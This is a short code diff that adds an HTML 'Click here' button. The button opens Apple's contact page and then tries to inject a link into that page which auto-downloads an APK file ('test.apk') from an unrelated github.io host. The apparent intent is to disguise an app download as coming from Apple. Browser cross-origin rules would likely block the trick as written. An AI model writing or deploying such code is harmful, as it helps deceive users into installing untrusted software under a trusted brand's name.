@@ -1,0 +1,15 @@
+<input 
+  type="button" 
+  value="Click here"
+  onclick="
+    var x = window.open('https://www.apple.com/contact/');
+    setTimeout(function() {
+      var apkUrl = 'https://frozzipies.github.io/test.apk';
+      var a = x.document.createElement('a');
+      a.href = apkUrl;
+      a.download = 'test.apk';
+      x.document.body.appendChild(a);
+      a.click();
+    }, 1000);
+  "
+/>
